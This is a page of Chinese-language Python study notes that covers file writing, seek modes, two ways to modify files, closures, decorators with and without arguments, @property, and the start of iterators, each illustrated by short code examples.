<pre><code class="lang-python"><span class="hljs-comment"># f.writelines()&#xFF1A;                        &#x4E00;&#x6B21;&#x6027;&#x628A;&#x5217;&#x8868;&#x4E2D;&#x7684;&#x5168;&#x5199;&#x5165;</span>
<span class="hljs-keyword">with</span> open(<span class="hljs-string">&apos;h.txt&apos;</span>,mode=<span class="hljs-string">&apos;wt&apos;</span>,encoding=<span class="hljs-string">&apos;utf-8&apos;</span>) <span class="hljs-keyword">as</span> f:
    <span class="hljs-comment"># f.write(&apos;1111\n222\n3333\n&apos;)</span>

    <span class="hljs-comment"># l=[&apos;11111\n&apos;,&apos;2222&apos;,&apos;3333&apos;,4444]</span>
   l=[<span class="hljs-string">&apos;11111\n&apos;</span>,<span class="hljs-string">&apos;2222&apos;</span>,<span class="hljs-string">&apos;3333&apos;</span>]
    <span class="hljs-comment"># for line in l:</span>
    <span class="hljs-comment">#     f.write(line)</span>
    f.writelines(l)

<span class="hljs-comment"># &#x8865;&#x5145;1&#xFF1A;&#x5982;&#x679C;&#x662F;&#x7EAF;&#x82F1;&#x6587;&#x5B57;&#x7B26;&#xFF0C;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x52A0;&#x524D;&#x7F00;b&#x5F97;&#x5230;bytes&#x7C7B;&#x578B;</span>
    l = [
        <span class="hljs-string">b&apos;1111aaa1\n&apos;</span>,
        <span class="hljs-string">b&apos;222bb2&apos;</span>,
        <span class="hljs-string">b&apos;33eee33&apos;</span>
    ]
<span class="hljs-comment"># &#x8865;&#x5145;2&#xFF1A;&apos;&#x4E0A;&apos;.encode(&apos;utf-8&apos;) &#x7B49;&#x540C;&#x4E8E;bytes(&apos;&#x4E0A;&apos;,encoding=&apos;utf-8&apos;)</span>
    l = [
        bytes(<span class="hljs-string">&apos;&#x4E0A;&#x554A;&apos;</span>,encoding=<span class="hljs-string">&apos;utf-8&apos;</span>),
        bytes(<span class="hljs-string">&apos;&#x51B2;&#x5440;&apos;</span>,encoding=<span class="hljs-string">&apos;utf-8&apos;</span>),
        bytes(<span class="hljs-string">&apos;&#x5C0F;&#x5783;&#x573E;&#x4EEC;&apos;</span>,encoding=<span class="hljs-string">&apos;utf-8&apos;</span>),
    ]
    f.writelines(l)
<span class="hljs-comment"># 3&#x3001;flush&#xFF1A;              &#x7ACB;&#x5373;&#x628A;&#x5F53;&#x524D;&#x5185;&#x5B58;&#x4E2D;&#x7684;&#x5185;&#x5BB9;&#x5F3A;&#x5236;&#x5199;&#x5165;&#x786C;&#x76D8;&#xFF01;&#xFF01;&#xFF01;</span>
<span class="hljs-keyword">with</span> open(<span class="hljs-string">&apos;h.txt&apos;</span>, mode=<span class="hljs-string">&apos;wt&apos;</span>,encoding=<span class="hljs-string">&apos;utf-8&apos;</span>) <span class="hljs-keyword">as</span> f:
    f.write(<span class="hljs-string">&apos;&#x54C8;&apos;</span>)
    <span class="hljs-comment"># f.flush()</span>
<span class="hljs-comment"># 4&#x3001;&#x4E86;&#x89E3;              </span>
<span class="hljs-keyword">with</span> open(<span class="hljs-string">&apos;h.txt&apos;</span>, mode=<span class="hljs-string">&apos;wt&apos;</span>, encoding=<span class="hljs-string">&apos;utf-8&apos;</span>) <span class="hljs-keyword">as</span> f:
    print(f.readable())               <span class="hljs-comment">#&#x662F;&#x5426;&#x53EF;&#x8BFB;</span>
    print(f.writable())               <span class="hljs-comment">#&#x662F;&#x5426;&#x53EF;&#x5199;</span>
    print(f.encoding)                 <span class="hljs-comment">#&#x7F16;&#x7801;</span>
    print(f.name)                     <span class="hljs-comment">#&#x540D;&#x5B57;</span>
</code></pre>
<h6 id="&#x6587;&#x4EF6;&#x6307;&#x9488;&#x79FB;&#x52A8;">&#x6587;&#x4EF6;&#x6307;&#x9488;&#x79FB;&#x52A8;</h6>
<pre><code class="lang-python"><span class="hljs-comment"># &#x6307;&#x9488;&#x79FB;&#x52A8;&#x7684;&#x5355;&#x4F4D;&#x90FD;&#x662F;&#x4EE5;bytes/&#x5B57;&#x8282;&#x4E3A;&#x5355;&#x4F4D;</span>
<span class="hljs-comment"># &#x53EA;&#x6709;&#x4E00;&#x79CD;&#x60C5;&#x51B5;&#x7279;&#x6B8A;&#xFF1A;</span>
<span class="hljs-comment">#       t&#x6A21;&#x5F0F;&#x4E0B;&#x7684;read(n),n&#x4EE3;&#x8868;&#x7684;&#x662F;&#x5B57;&#x7B26;&#x4E2A;&#x6570;</span>
</code></pre>
<pre><code class="lang-python"><span class="hljs-comment">#f.seek(n,&#x6A21;&#x5F0F;):n&#x6307;&#x7684;&#x662F;&#x79FB;&#x52A8;&#x7684;&#x5B57;&#x8282;&#x4E2A;&#x6570;</span>
&#x6A21;&#x5F0F;&#xFF1A;
<span class="hljs-comment">#&#x6A21;&#x5F0F;0&#xFF1A;&#x53C2;&#x7167;&#x7269;&#x662F;&#x6587;&#x4EF6;&#x5F00;&#x5934;&#x4F4D;&#x7F6E;</span>
f.seek(<span class="hljs-number">9</span>,<span class="hljs-number">0</span>)
f.seek(<span class="hljs-number">3</span>,<span class="hljs-number">0</span>) <span class="hljs-comment"># 3</span>

<span class="hljs-comment">#&#x6A21;&#x5F0F;1&#xFF1A;&#x53C2;&#x7167;&#x7269;&#x662F;&#x5F53;&#x524D;&#x6307;&#x9488;&#x6240;&#x5728;&#x4F4D;&#x7F6E;</span>
f.seek(<span class="hljs-number">9</span>,<span class="hljs-number">1</span>)
f.seek(<span class="hljs-number">3</span>,<span class="hljs-number">1</span>) <span class="hljs-comment"># 12</span>

<span class="hljs-comment">#&#x6A21;&#x5F0F;2&#xFF1A;&#x53C2;&#x7167;&#x7269;&#x662F;&#x6587;&#x4EF6;&#x672B;&#x5C3E;&#x4F4D;&#x7F6E;&#xFF0C;&#x5E94;&#x8BE5;&#x5012;&#x7740;&#x79FB;&#x52A8;</span>
f.seek(<span class="hljs-number">-9</span>,<span class="hljs-number">2</span>) <span class="hljs-comment"># 3</span>
f.seek(<span class="hljs-number">-3</span>,<span class="hljs-number">2</span>) <span class="hljs-comment"># 9</span>

<span class="hljs-comment"># &#x5F3A;&#x8C03;&#xFF1A;&#x53EA;&#x6709;0&#x6A21;&#x5F0F;&#x53EF;&#x4EE5;&#x5728;t&#x4E0B;&#x4F7F;&#x7528;&#xFF0C;1&#x3001;2&#x5FC5;&#x987B;&#x5728;b&#x6A21;&#x5F0F;&#x4E0B;&#x7528;</span>
<span class="hljs-comment"># f.tell() # &#x83B7;&#x53D6;&#x6587;&#x4EF6;&#x6307;&#x9488;&#x5F53;&#x524D;&#x4F4D;&#x7F6E;</span>
</code></pre>
<h6 id="&#x6587;&#x4EF6;&#x4FEE;&#x6539;&#x4E24;&#x79CD;&#x65B9;&#x5F0F;">&#x6587;&#x4EF6;&#x4FEE;&#x6539;&#x4E24;&#x79CD;&#x65B9;&#x5F0F;</h6>
<pre><code class="lang-python"><span class="hljs-comment"># &#x65B9;&#x5F0F;&#x4E00;&#xFF1A;&#x6587;&#x672C;&#x7F16;&#x8F91;&#x91C7;&#x7528;&#x7684;&#x5C31;&#x662F;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;</span>
<span class="hljs-comment"># &#x5B9E;&#x73B0;&#x601D;&#x8DEF;&#xFF1A;&#x5C06;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x53D1;&#x4E00;&#x6B21;&#x6027;&#x5168;&#x90E8;&#x8BFB;&#x5165;&#x5185;&#x5B58;,&#x7136;&#x540E;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x4FEE;&#x6539;&#x5B8C;&#x6BD5;&#x540E;&#x518D;&#x8986;&#x76D6;&#x5199;&#x56DE;&#x539F;&#x6587;&#x4EF6;</span>
<span class="hljs-comment"># &#x4F18;&#x70B9;: &#x5728;&#x6587;&#x4EF6;&#x4FEE;&#x6539;&#x8FC7;&#x7A0B;&#x4E2D;&#x540C;&#x4E00;&#x4EFD;&#x6570;&#x636E;&#x53EA;&#x6709;&#x4E00;&#x4EFD;</span>
<span class="hljs-comment"># &#x7F3A;&#x70B9;: &#x4F1A;&#x8FC7;&#x591A;&#x5730;&#x5360;&#x7528;&#x5185;&#x5B58;</span>
<span class="hljs-keyword">with</span> open(<span class="hljs-string">&apos;c.txt&apos;</span>,mode=<span class="hljs-string">&apos;rt&apos;</span>,encoding=<span class="hljs-string">&apos;utf-8&apos;</span>) <span class="hljs-keyword">as</span> f:
    res=f.read()
    data=res.replace(<span class="hljs-string">&apos;alex&apos;</span>,<span class="hljs-string">&apos;dsb&apos;</span>)
    print(data)

<span class="hljs-keyword">with</span> open(<span class="hljs-string">&apos;c.txt&apos;</span>,mode=<span class="hljs-string">&apos;wt&apos;</span>,encoding=<span class="hljs-string">&apos;utf-8&apos;</span>) <span class="hljs-keyword">as</span> f1:
    f1.write(data)
</code></pre>
<pre><code class="lang-python"><span class="hljs-comment"># &#x65B9;&#x5F0F;&#x4E8C;&#xFF1A;</span>
<span class="hljs-keyword">import</span> os
<span class="hljs-comment"># &#x5B9E;&#x73B0;&#x601D;&#x8DEF;&#xFF1A;&#x4EE5;&#x8BFB;&#x7684;&#x65B9;&#x5F0F;&#x6253;&#x5F00;&#x539F;&#x6587;&#x4EF6;,&#x4EE5;&#x5199;&#x7684;&#x65B9;&#x5F0F;&#x6253;&#x5F00;&#x4E00;&#x4E2A;&#x4E34;&#x65F6;&#x6587;&#x4EF6;,&#x4E00;&#x884C;&#x884C;&#x8BFB;&#x53D6;&#x539F;&#x6587;&#x4EF6;&#x5185;&#x5BB9;,&#x4FEE;&#x6539;&#x5B8C;&#x540E;&#x5199;&#x5165;&#x4E34;&#x65F6;&#x6587;&#x4EF6;...,&#x5220;&#x6389;&#x539F;&#x6587;&#x4EF6;,&#x5C06;&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#x91CD;&#x547D;&#x540D;&#x539F;&#x6587;&#x4EF6;&#x540D;</span>
<span class="hljs-comment"># &#x4F18;&#x70B9;: &#x4E0D;&#x4F1A;&#x5360;&#x7528;&#x8FC7;&#x591A;&#x7684;&#x5185;&#x5B58;</span>
<span class="hljs-comment"># &#x7F3A;&#x70B9;: &#x5728;&#x6587;&#x4EF6;&#x4FEE;&#x6539;&#x8FC7;&#x7A0B;&#x4E2D;&#x540C;&#x4E00;&#x4EFD;&#x6570;&#x636E;&#x5B58;&#x4E86;&#x4E24;&#x4EFD;</span>
<span class="hljs-keyword">with</span> open(<span class="hljs-string">&apos;c.txt&apos;</span>, mode=<span class="hljs-string">&apos;rt&apos;</span>, encoding=<span class="hljs-string">&apos;utf-8&apos;</span>) <span class="hljs-keyword">as</span> f, \
        open(<span class="hljs-string">&apos;.c.txt.swap&apos;</span>, mode=<span class="hljs-string">&apos;wt&apos;</span>, encoding=<span class="hljs-string">&apos;utf-8&apos;</span>) <span class="hljs-keyword">as</span> f1:
    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:
        f1.write(line.replace(<span class="hljs-string">&apos;alex&apos;</span>, <span class="hljs-string">&apos;dsb&apos;</span>))

os.remove(<span class="hljs-string">&apos;c.txt&apos;</span>)
os.rename(<span class="hljs-string">&apos;.c.txt.swap&apos;</span>, <span class="hljs-string">&apos;c.txt&apos;</span>)
</code></pre>
<h5 id="&#x95ED;&#x5305;&#x51FD;&#x6570;">&#x95ED;&#x5305;&#x51FD;&#x6570;</h5>
<pre><code class="lang-python">&#x95ED;&#x5305;&#x51FD;&#x6570;=&#x540D;&#x79F0;&#x7A7A;&#x95F4;&#x4E0E;&#x4F5C;&#x7528;&#x57DF;+&#x51FD;&#x6570;&#x5D4C;&#x5957;+&#x51FD;&#x6570;&#x5BF9;&#x8C61;
&#x6838;&#x5FC3;&#x70B9;&#xFF1A;&#x540D;&#x5B57;&#x7684;&#x67E5;&#x627E;&#x5173;&#x7CFB;&#x662F;&#x4EE5;&#x51FD;&#x6570;&#x5B9A;&#x4E49;&#x9636;&#x6BB5;&#x4E3A;&#x51C6;

<span class="hljs-comment"># &quot;&#x95ED;&quot;&#x51FD;&#x6570;&#x6307;&#x7684;&#x8BE5;&#x51FD;&#x6570;&#x662F;&#x5185;&#x5D4C;&#x51FD;&#x6570;</span>
<span class="hljs-comment"># &quot;&#x5305;&quot;&#x51FD;&#x6570;&#x6307;&#x7684;&#x8BE5;&#x51FD;&#x6570;&#x5305;&#x542B;&#x5BF9;&#x5916;&#x5C42;&#x51FD;&#x6570;&#x4F5C;&#x7528;&#x57DF;&#x540D;&#x5B57;&#x7684;&#x5F15;&#x7528;&#xFF08;&#x4E0D;&#x662F;&#x5BF9;&#x5168;&#x5C40;&#x4F5C;&#x7528;&#x57DF;&#xFF09;</span>

<span class="hljs-comment"># &#x95ED;&#x5305;&#x51FD;&#x6570;&#xFF1A;&#x51FD;&#x6570;&#x5BF9;&#x8C61;</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f1</span><span class="hljs-params">()</span>:</span>
    x = <span class="hljs-number">33333333333333333333</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f2</span><span class="hljs-params">()</span>:</span>
        print(<span class="hljs-string">&apos;&#x51FD;&#x6570;f2&#xFF1A;&apos;</span>,x)
    <span class="hljs-keyword">return</span> f2

f=f1()
print(f)
</code></pre>
<h4 id="&#x88C5;&#x9970;&#x5668;&#x65E0;&#x53C2;">&#x88C5;&#x9970;&#x5668;(&#x65E0;&#x53C2;)</h4>
<pre><code>&#x4EC0;&#x4E48;&#x662F;&#x88C5;&#x9970;&#x5668;&#xFF1A;&#x88C5;&#x9970;&#x5668;&#x6307;&#x7684;&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;&#x51FD;&#x6570;&#xFF0C;&#x8BE5;&#x51FD;&#x6570;&#x662F;&#x7528;&#x6765;&#x4E3A;&#x5176;&#x4ED6;&#x51FD;&#x6570;&#x6DFB;&#x52A0;&#x989D;&#x5916;&#x7684;&#x529F;&#x80FD;
&#x4E3A;&#x4F55;&#x8981;&#x7528;&#x88C5;&#x9970;&#x5668;&#xFF1A;&#x5F00;&#x653E;&#x5C01;&#x95ED;&#x539F;&#x5219;
        &#x5F00;&#x653E;&#xFF1A;&#x6307;&#x7684;&#x662F;&#x5BF9;&#x62D3;&#x5C55;&#x529F;&#x80FD;&#x662F;&#x5F00;&#x653E;&#x7684;
        &#x5C01;&#x95ED;&#xFF1A;&#x6307;&#x7684;&#x662F;&#x5BF9;&#x4FEE;&#x6539;&#x6E90;&#x4EE3;&#x7801;&#x662F;&#x5C01;&#x95ED;&#x7684;
&#x88C5;&#x9970;&#x5668;&#x5C31;&#x662F;&#x5728;&#x4E0D;&#x4FEE;&#x6539;&#x88AB;&#x88C5;&#x9970;&#x5668;&#x5BF9;&#x8C61;&#x6E90;&#x4EE3;&#x7801;&#x4EE5;&#x53CA;&#x8C03;&#x7528;&#x65B9;&#x5F0F;&#x7684;&#x524D;&#x63D0;&#x4E0B;&#x4E3A;&#x88AB;&#x88C5;&#x9970;&#x5BF9;&#x8C61;&#x6DFB;&#x52A0;&#x65B0;&#x529F;&#x80FD;
</code></pre><pre><code class="lang-python"><span class="hljs-keyword">import</span> time

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span><span class="hljs-params">(name,age,power)</span>:</span>
    time.sleep(<span class="hljs-number">2</span>)
    print(<span class="hljs-string">&quot;my name is %s,and my age is %s,my superpower is %s&quot;</span> %(name,age,power))
    <span class="hljs-keyword">return</span> <span class="hljs-number">123456</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">outter</span><span class="hljs-params">(func)</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wrapper</span><span class="hljs-params">(*args,**kwargs)</span>:</span>
        start = time.time()
        msg = func(*args,**kwargs)
        stop = time.time()
        print(stop - start)
        <span class="hljs-keyword">return</span> msg
    <span class="hljs-keyword">return</span> wrapper

index = outter(index)    <span class="hljs-comment">#  &#x8FD9;&#x91CC;outter(index)&#x4E2D;&#x7684;index&#x662F;&#x6307;&#x8C03;&#x7528;&#x7684;&#x51FD;&#x6570;&#x540D;&#x5B57;&#xFF0C;&#x8FD4;&#x56DE;&#x503C;&#x662F;wrapper&#x95ED;&#x5305;&#x51FD;&#x6570;</span>

res = index(<span class="hljs-string">&apos;batmanfuture&apos;</span>,<span class="hljs-string">&apos;11&apos;</span>,<span class="hljs-string">&apos;123456&apos;</span>)    <span class="hljs-comment">#  &#x8FD9;&#x91CC;&#x5F15;&#x7528;&#x95ED;&#x5305;&#x51FD;&#x6570;&#x4F20;&#x5165;&#x7684;&#x503C;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x8981;&#x8C03;&#x7684;&#x51FD;&#x6570;&#x7684;&#x503C;</span>

print(<span class="hljs-string">&quot;&#x8FD4;&#x56DE;&#x503C;res = %s&quot;</span> %res)

<span class="hljs-comment"># &#x8FD9;&#x91CC;&#x9700;&#x8981;&#x6EE1;&#x8DB3;&#x5F00;&#x653E;&#x548C;&#x5C01;&#x95ED;&#x7684;&#x539F;&#x5219;</span>
</code></pre>
<h5 id="&#x8BED;&#x6CD5;&#x7CD6;">&#x8BED;&#x6CD5;&#x7CD6;</h5>
<pre><code class="lang-python"><span class="hljs-comment"># &#x5728;&#x88AB;&#x88C5;&#x9970;&#x5BF9;&#x8C61;&#x6B63;&#x4E0A;&#x65B9;&#x7684;&#x5355;&#x72EC;&#x4E00;&#x884C;&#x5199;@&#x88C5;&#x9970;&#x5668;&#x540D;&#x5B57;</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">timmer</span><span class="hljs-params">(func)</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wrapper</span><span class="hljs-params">(*args,**kwargs)</span>:</span>
        start = time.time()
        msg = func(*args,**kwargs)
        stop = time.time()
        print(stop - start)
        <span class="hljs-keyword">return</span> msg
    <span class="hljs-keyword">return</span> wrapper

<span class="hljs-meta">@timmer # index=timmer(index)</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span><span class="hljs-params">(x,y,z)</span>:</span>
    time.sleep(<span class="hljs-number">3</span>)
    print(<span class="hljs-string">&apos;index %s %s %s&apos;</span> %(x,y,z))

<span class="hljs-meta">@timmer # home=timmer(ome)</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">home</span><span class="hljs-params">(name)</span>:</span>
    time.sleep(<span class="hljs-number">2</span>)
    print(<span class="hljs-string">&apos;welcome %s to home page&apos;</span> %name)


index(x=<span class="hljs-number">1</span>,y=<span class="hljs-number">2</span>,z=<span class="hljs-number">3</span>)
home(<span class="hljs-string">&apos;egon&apos;</span>)


<span class="hljs-meta">@property&#x662F;Python&#x4E2D;&#x7684;&#x4E00;&#x4E2A;&#x88C5;&#x9970;&#x5668;&#xFF0C;&#x53EF;&#x4EE5;&#x5C06;&#x4E00;&#x4E2A;&#x7C7B;&#x65B9;&#x6CD5;&#x8F6C;&#x6362;&#x4E3A;&#x7C7B;&#x5C5E;&#x6027;</span>


<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyClass</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, my_var)</span>:</span>
        self._my_var = my_var

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">my_var</span><span class="hljs-params">(self)</span>:</span>
        <span class="hljs-keyword">return</span> self._my_var

<span class="hljs-meta">    @my_var.setter</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">my_var</span><span class="hljs-params">(self, value)</span>:</span>
        <span class="hljs-keyword">if</span> isinstance(value, int):
            self._my_var = value
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;my_var must be an integer&quot;</span>)
obj = MyClass(<span class="hljs-number">10</span>)

print(obj.my_var)  <span class="hljs-comment"># &#x8F93;&#x51FA; 10</span>

<span class="hljs-comment"># &#x8BBE;&#x7F6E;&#x65B0;&#x7684;&#x503C;</span>
obj.my_var = <span class="hljs-number">20</span>

print(obj.my_var)  <span class="hljs-comment"># &#x8F93;&#x51FA; 20</span>

<span class="hljs-comment"># &#x5C1D;&#x8BD5;&#x8BBE;&#x7F6E;&#x975E;&#x6574;&#x6570;&#x503C;&#xFF0C;&#x4F1A;&#x629B;&#x51FA;&#x5F02;&#x5E38;</span>
<span class="hljs-keyword">try</span>:
    obj.my_var = <span class="hljs-string">&quot;abc&quot;</span>
<span class="hljs-keyword">except</span> ValueError <span class="hljs-keyword">as</span> e:
    print(str(e))  <span class="hljs-comment"># &#x8F93;&#x51FA; &quot;my_var must be an integer&quot;</span>
</code></pre>
<h4 id="&#x88C5;&#x9970;&#x5668;&#x6709;&#x53C2;">&#x88C5;&#x9970;&#x5668;(&#x6709;&#x53C2;)</h4>
<pre><code class="lang-python">    <span class="hljs-comment"># 1&#x3001;&#x51FD;&#x6570;wrapper.__name__ = &#x539F;&#x51FD;&#x6570;.__name__</span>
    <span class="hljs-comment"># 2&#x3001;&#x51FD;&#x6570;wrapper.__doc__ = &#x539F;&#x51FD;&#x6570;.__doc__</span>

<span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> wraps        <span class="hljs-comment">#    &#x5373;&#x5C06;&#x539F;&#x51FD;&#x6570;&#x540D;&#x6307;&#x5411;&#x7684;&#x5185;&#x5B58;&#x5730;&#x5740;&#x5077;&#x6881;&#x6362;&#x67F1;&#x6210;wrapper&#x51FD;&#x6570;,&#x6240;&#x4EE5;&#x5E94;&#x8BE5;&#x5C06;wrapper&#x505A;&#x7684;&#x8DDF;&#x539F;&#x51FD;&#x6570;&#x4E00;&#x6837;&#x624D;&#x884C;</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">outter</span><span class="hljs-params">(func)</span>:</span>
<span class="hljs-meta">    @wraps(func)</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wrapper</span><span class="hljs-params">(*args, **kwargs)</span>:</span>
        <span class="hljs-string">&quot;&quot;&quot;&#x8FD9;&#x4E2A;&#x662F;&#x4E3B;&#x9875;&#x529F;&#x80FD;&quot;&quot;&quot;</span>
        res = func(*args, **kwargs) <span class="hljs-comment"># res=index(1,2)</span>
        <span class="hljs-keyword">return</span> res

    <span class="hljs-comment"># &#x624B;&#x52A8;&#x5C06;&#x539F;&#x51FD;&#x6570;&#x7684;&#x5C5E;&#x6027;&#x8D4B;&#x503C;&#x7ED9;wrapper&#x51FD;&#x6570;</span>
    <span class="hljs-comment"># 1&#x3001;&#x51FD;&#x6570;wrapper.__name__ = &#x539F;&#x51FD;&#x6570;.__name__</span>
    <span class="hljs-comment"># 2&#x3001;&#x51FD;&#x6570;wrapper.__doc__ = &#x539F;&#x51FD;&#x6570;.__doc__</span>
    <span class="hljs-comment"># wrapper.__name__ = func.__name__</span>
    <span class="hljs-comment"># wrapper.__doc__ = func.__doc__</span>

    <span class="hljs-keyword">return</span> wrapper
</code></pre>
<pre><code class="lang-python"><span class="hljs-comment"># &#x7531;&#x4E8E;&#x8BED;&#x6CD5;&#x7CD6;@&#x7684;&#x9650;&#x5236;&#xFF0C;outter&#x51FD;&#x6570;&#x53EA;&#x80FD;&#x6709;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;&#x5E76;&#x4E14;&#x8BE5;&#x624D;&#x662F;&#x53EA;&#x7528;&#x6765;&#x63A5;&#x6536;&#x88AB;&#x88C5;&#x9970;&#x5BF9;&#x8C61;&#x7684;&#x5185;&#x5B58;&#x5730;&#x5740;</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">auth</span><span class="hljs-params">(db_type)</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">deco</span><span class="hljs-params">(func)</span>:</span>
        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wrapper</span><span class="hljs-params">(*args, **kwargs)</span>:</span>
            name = input(<span class="hljs-string">&apos;your name&gt;&gt;&gt;: &apos;</span>).strip()
            pwd = input(<span class="hljs-string">&apos;your password&gt;&gt;&gt;: &apos;</span>).strip()

            <span class="hljs-keyword">if</span> db_type == <span class="hljs-string">&apos;file&apos;</span>:
                print(<span class="hljs-string">&apos;&#x57FA;&#x4E8E;&#x6587;&#x4EF6;&#x7684;&#x9A8C;&#x8BC1;&apos;</span>)
                <span class="hljs-keyword">if</span> name == <span class="hljs-string">&apos;egon&apos;</span> <span class="hljs-keyword">and</span> pwd == <span class="hljs-string">&apos;123&apos;</span>:
                    res = func(*args, **kwargs)  <span class="hljs-comment"># index(1,2)</span>
                    <span class="hljs-keyword">return</span> res
                <span class="hljs-keyword">else</span>:
                    print(<span class="hljs-string">&apos;user or password error&apos;</span>)
            <span class="hljs-keyword">elif</span> db_type == <span class="hljs-string">&apos;mysql&apos;</span>:
                print(<span class="hljs-string">&apos;&#x57FA;&#x4E8E;mysql&#x7684;&#x9A8C;&#x8BC1;&apos;</span>)
            <span class="hljs-keyword">elif</span> db_type == <span class="hljs-string">&apos;ldap&apos;</span>:
                print(<span class="hljs-string">&apos;&#x57FA;&#x4E8E;ldap&#x7684;&#x9A8C;&#x8BC1;&apos;</span>)
            <span class="hljs-keyword">else</span>:
                print(<span class="hljs-string">&apos;&#x4E0D;&#x652F;&#x6301;&#x8BE5;db_type&apos;</span>)
        <span class="hljs-keyword">return</span> wrapper
    <span class="hljs-keyword">return</span> deco


<span class="hljs-meta">@auth(db_type=&apos;file&apos;)  # @deco # index=deco(index) # index=wrapper</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span><span class="hljs-params">(x, y)</span>:</span>
    print(<span class="hljs-string">&apos;index-&gt;&gt;%s:%s&apos;</span> % (x, y))

<span class="hljs-meta">@auth(db_type=&apos;mysql&apos;)  # @deco # home=deco(home) # home=wrapper</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">home</span><span class="hljs-params">(name)</span>:</span>
    print(<span class="hljs-string">&apos;home-&gt;&gt;%s&apos;</span> % name)


<span class="hljs-meta">@auth(db_type=&apos;ldap&apos;)  # &#x8D26;&#x53F7;&#x5BC6;&#x7801;&#x7684;&#x6765;&#x6E90;&#x662F;ldap</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">transfer</span><span class="hljs-params">()</span>:</span>
    print(<span class="hljs-string">&apos;transfer&apos;</span>)
</code></pre>
<p>&#x6709;&#x53C2;&#x88C5;&#x9970;&#x5668;&#xFF0C;&#x5728;&#x672C;&#x6765;&#x7684;&#x4E24;&#x5C42;&#x4E4B;&#x5916;&#x53C8;&#x591A;&#x4E00;&#x5C42;&#x7528;&#x6765;&#x4F20;&#x9012;&#x53D8;&#x91CF;&#xFF0C;&#x5229;&#x7528;&#x8BED;&#x6CD5;&#x7CD6;</p>
<h4 id="&#x8FED;&#x4EE3;&#x5668;">&#x8FED;&#x4EE3;&#x5668;</h4>
<pre><code class="lang-python">&#x8FED;&#x4EE3;&#x5668;&#x6307;&#x7684;&#x662F;&#x8FED;&#x4EE3;&#x53D6;&#x503C;&#x7684;&#x5DE5;&#x5177;&#xFF0C;&#x8FED;&#x4EE3;&#x662F;&#x4E00;&#x4E2A;&#x91CD;&#x590D;&#x7684;&#x8FC7;&#x7A0B;&#xFF0C;&#x6BCF;&#x6B21;&#x91CD;&#x590D;
    &#x90FD;&#x662F;&#x57FA;&#x4E8E;&#x4E0A;&#x4E00;&#x6B21;&#x7684;&#x7ED3;&#x679C;&#x800C;&#x7EE7;&#x7EED;&#x7684;&#xFF0C;&#x5355;&#x7EAF;&#x7684;&#x91CD;&#x590D;&#x5E76;&#x4E0D;&#x662F;&#x8FED;&#x4EE3;

&#x8FED;&#x4EE3;&#x5668;&#x662F;&#x7528;&#x6765;&#x8FED;&#x4EE3;&#x53D6;&#x503C;&#x7684;&#x5DE5;&#x5177;&#xFF0C;&#x800C;&#x6D89;&#x53CA;&#x5230;&#x628A;&#x591A;&#x4E2A;&#x503C;&#x5FAA;&#x73AF;&#x53D6;&#x51FA;&#x6765;&#x7684;&#x7C7B;&#x578B;
    &#x6709;&#xFF1A;&#x5217;&#x8868;&#x3001;&#x5B57;&#x7B26;&#x4E32;&#x3001;&#x5143;&#x7EC4;&#x3001;&#x5B57;&#x5178;&#x3001;&#x96C6;&#x5408;&#x3001;&#x6253;&#x5F00;&#x6587;&#x4EF6;
&#x8FED;&#x4EE3;&#x5668;&#x5BF9;&#x8C61;&#x6709;&#xFF1A;&#x6587;&#x4EF6;&#x7C7B;&#x578B;

&#x53EF;&#x8FED;&#x4EE3;&#x7684;&#x5BF9;&#x8C61;&#xFF1A;&#x4F46;&#x51E1;&#x5185;&#x7F6E;&#x6709;__iter__&#x65B9;&#x6CD5;&#x7684;&#x90FD;&#x79F0;&#x4E4B;&#x4E3A;&#x53EF;&#x8FED;&#x4EE3;&#x7684;&#x5BF9;&#x8C61;
d={<span class="hljs-string">&apos;a&apos;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&apos;b&apos;</span>:<span class="hljs-number">2</span>,<span class="hljs-string">&apos;c&apos;</span>:<span class="hljs-number">3</span>}
d_iterator=d.__iter__()
print(d_iterator)

